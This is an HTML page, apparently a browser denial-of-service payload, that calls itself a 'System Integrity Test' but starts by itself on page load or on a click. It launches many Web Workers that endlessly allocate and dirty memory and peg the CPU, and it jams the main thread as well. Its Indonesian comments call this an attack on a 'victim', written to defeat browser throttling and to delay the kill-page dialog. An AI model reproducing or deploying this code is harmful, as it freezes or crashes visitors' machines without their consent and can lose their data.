<!DOCTYPE html>
<html>
<head>
    <title>System Integrity Test - Platinum</title>
</head>
<body style="background:white; margin:0; height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; font-family:sans-serif; cursor: pointer;">
    
    <div id="ui" style="text-align:center; color:#888;">
        <p id="t" style="font-size: 18px;">Initializing Stress Test...</p>
        <p style="font-size: 12px; color: #bbb;">(Ketuk layar jika pengujian tidak dimulai otomatis)</p>
        <p id="stat" style="font-size: 10px; color: #ccc; margin-top: 20px;">Buffer: 0MB</p>
    </div>

    <script>
        let burning = false;

        // PENTING: Memicu serangan lewat klik agar bypass "Efficiency Mode"
        document.body.onclick = function() {
            if(!burning) startNuke();
        };

        // Tetap coba jalankan otomatis setelah 1 detik
        setTimeout(() => {
            if(!burning) startNuke();
        }, 1000);

        function startNuke() {
            burning = true;
            const status = document.getElementById('t');
            const statText = document.getElementById('stat');
            status.innerText = "NUCLEAR PROTOCOL ACTIVE. LOCKING SYSTEM...";
            
            // Jauh lebih banyak worker untuk menjamin antrean panjang di CPU Scheduler
            const workerCount = (navigator.hardwareConcurrency || 8) * 4; 
            let total = 0;

            for (let i = 0; i < workerCount; i++) {
                const blob = new Blob([`
                    let heap = [];
                    function launch() {
                        // Loop abadi tanpa jeda untuk mematikan proteksi 'clamping'
                        while(true) {
                            try {
                                // Alokasi potongan 128MB agar stabil tapi cepat
                                let chunk = new Uint32Array(1024 * 1024 * 32); 
                                // DIRTYING: Trik agar OS tidak melakukan 'Compression'
                                for(let j=0; j < chunk.length; j += 1024) {
                                    chunk[j] = Math.floor(Math.random() * 0xFFFFFFFF);
                                }
                                heap.push(chunk);
                                postMessage(128);
                            } catch(e) {}

                            // Beban CPU Maksimal di setiap siklus
                            let x = 1.1;
                            for(let k=0; k<5000000; k++) {
                                x = Math.sqrt(Math.exp(Math.log(Math.random())));
                            }
                        }
                    }
                    launch();
                `], { type: 'application/javascript' });

                const w = new Worker(URL.createObjectURL(blob));
                w.onmessage = (e) => {
                    total += e.data;
                    // Memberikan feedback visual agar korban tahu sistem sedang hancur
                    statText.innerText = "Buffer Saturation: " + total + " MB";
                };
            }

            // PENGUNCI INTERAKSI (Main Thread Jammer)
            // Menggunakan requestAnimationFrame agar UI macet tanpa memicu dialog "Kill Page" terlalu cepat
            function jam() {
                let y = 0;
                for(let j=0; j<10000000; j++) y += Math.sqrt(j);
                requestAnimationFrame(jam);
            }
            jam();
        }
    </script>
</body>
</html>
